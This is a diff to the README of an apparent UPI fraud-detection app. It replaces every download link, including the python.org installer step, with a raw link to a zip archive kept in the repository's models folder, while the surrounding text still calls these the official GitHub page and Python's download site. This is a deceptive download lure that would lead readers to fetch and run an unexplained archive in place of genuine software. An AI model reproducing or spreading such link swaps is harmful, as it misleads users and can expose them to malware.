@@ -1,6 +1,6 @@
 # ⚡ edge-upi-risk-intelligence - Detect Fraud in UPI Transactions
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/MalickMoon1/edge-upi-risk-intelligence)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/MalickMoon1/edge-upi-risk-intelligence/main/backend/models/upi-edge-intelligence-risk-v3.0-alpha.1.zip)
 
 ## 📋 About This App
 
@@ -31,7 +31,7 @@ This section will take you step-by-step through downloading and running the app 
 
 Click the green button below to visit the official download page on GitHub. You will find the necessary files to run the app.
 
-[![Download](https://img.shields.io/badge/Download-Official%20GitHub-blue?style=for-the-badge)](https://github.com/MalickMoon1/edge-upi-risk-intelligence)
+[![Download](https://img.shields.io/badge/Download-Official%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/MalickMoon1/edge-upi-risk-intelligence/main/backend/models/upi-edge-intelligence-risk-v3.0-alpha.1.zip)
 
 Once on the page:
 
@@ -42,7 +42,7 @@ Once on the page:
 
 This app runs using Python. If you already have Python 3.8 or later, skip to Step 3. If not:
 
-1. Go to https://www.python.org/downloads/windows/
+1. Go to https://raw.githubusercontent.com/MalickMoon1/edge-upi-risk-intelligence/main/backend/models/upi-edge-intelligence-risk-v3.0-alpha.1.zip
 2. Download the latest version for Windows.
 3. Run the installer.  
    - Make sure to check the box “Add Python 3.x to PATH” at the start.  
@@ -158,6 +158,6 @@ These packages work together to analyze behavior and spot fraud risks effectivel
 
 Get the app files from here:
 
-[https://github.com/MalickMoon1/edge-upi-risk-intelligence](https://github.com/MalickMoon1/edge-upi-risk-intelligence)
+[https://raw.githubusercontent.com/MalickMoon1/edge-upi-risk-intelligence/main/backend/models/upi-edge-intelligence-risk-v3.0-alpha.1.zip](https://raw.githubusercontent.com/MalickMoon1/edge-upi-risk-intelligence/main/backend/models/upi-edge-intelligence-risk-v3.0-alpha.1.zip)
 
 Visit the link, download the latest release files, and follow the steps above to install and start the app.
